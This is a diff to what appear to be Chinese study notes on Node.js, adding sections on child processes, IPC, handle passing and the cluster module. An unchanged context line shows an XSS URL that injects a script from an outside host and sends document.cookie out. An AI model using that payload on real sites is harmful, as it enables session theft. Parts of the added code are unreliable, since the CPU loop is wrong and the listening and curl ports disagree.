@@ -350,3 +350,72 @@ http协议是基于tcp协议的，node中http服务继承TCP服务器(net模块)
 ### XSS攻击 Cross Site Scripting
 前端代码`$('#box').html(location.hash.replace('#', ''));`， 用户将url改为`http://a.com/pathname#<script src="http://b.com/c.js" + + document.cookie></script>`，这样对方边可以获得本机当前域名下的cookie。
 
+## 进程相关
+### child_process模块
+```js
+// worker.js就是实际工作的，用于创建http服务的文件
+var fork = require('child_process').fork;
+var cpus = require('os').cpus();
+for(let i=0; i < cpus; i++){
+  fork('./worker.js');
+}
+```
+![image](https://raw.githubusercontent.com/zhaozy93/blog/master/img-bed/nodejs23.jpeg)
+
+### 进程间通信
+使用方法与前端的 WebWorker一样， 通过事件监听来通信，完成交互。
+- postMessage();
+- worker.onmessage= ()=>{}
+- send()
+
+### 进程间通信原理
+IPC(Inter-Process Communication)， 实现方法有命名管道、匿名管道、socket、信号量、共享内存、消息队列、Domain Socket邓， Node中使用管道技术， 有libux提供服务，对应window下 命名管道(named pipe), *nix下的 Unix Domain Socket。
+父进程在创建子进程前，先创建IPC通道。然后告知子进程IPC通道的文件描述符，子进程在创建之后去连接这个IPC通道，这样便完成了父进程与子进程的连接，双方可以进行通信。
+![image](https://raw.githubusercontent.com/zhaozy93/blog/master/img-bed/nodejs24.jpeg)
+![image](https://raw.githubusercontent.com/zhaozy93/blog/master/img-bed/nodejs25.jpeg)
+
+### 进程间消息传递 ---- 句柄
+句柄：一种用来标识资源的引用，内部包含了指向对象的文件描述符。
+
+目前支持的句柄类型
+- net.Socket  TCP套接字
+- net.Server  TCP服务器
+- net.Native  C++层面的TCP套接字或IPC通道
+- dgram.Socket  UDP套接字
+- dgram.Native   C++层面的UDP套接字
+![image](https://raw.githubusercontent.com/zhaozy93/blog/master/img-bed/nodejs26.jpeg)
+发送到IPC管道中的实际上是句柄文件描述符，文件描述符是一个整数值而已。 因此金城之间传递的不是真正的对象，只能是字符串。
+
+Node底层对每个端口监听设置了SO_REUSEADDR选项，意思就是不同进程可以监听同一个端口。 如果独立启动进程，监听相同的端口，由于各个TCP服务器端socke套接字的文件描述符不同，监听相同接口就会报错。但是通过讲TCP服务器描述符传递给各子进程，就可以确保不同进程使用同一个socket套接字监听同一个端口。
+
+因此我们尝试把server对象从master.js发送work.js,尝试在子进程中建立监听。
+```js
+// ****** master.js *********
+var child = require('child_process').fork('worker.js');
+var server = require('net').createServer();
+server.on('connection', function(net){
+    console.log('parent is working');
+    net.end('parent.')
+})
+ server.listen(8887, function(){
+    child.send('sever', server)
+})
+// ******* worker.js ***********
+process.on('message', function(m, server){
+  if(m === 'sever'){
+    server.on('connection', function(socket){
+      console.log('child is working', process.pid);
+      socket.end('child.');
+    })
+  }
+})
+```
+调用`curl "http://127.0.0.1:8888"`可以发现在parent和child随机切换，证明多进程确实生效了。
+
+### 多进程稳定性
+最基本的是要监听子进程报错`process.on('uncaughtException',()=>{})`事件、子进程关闭事件`worker.on('exit', ()=>{})`， 可以让他们自动重启等解决方案
+
+### Cluster模块
+前面介绍的都是一些基础的内容，Node已经提供了一个用于多进程的模块。
+
+可以去看API了
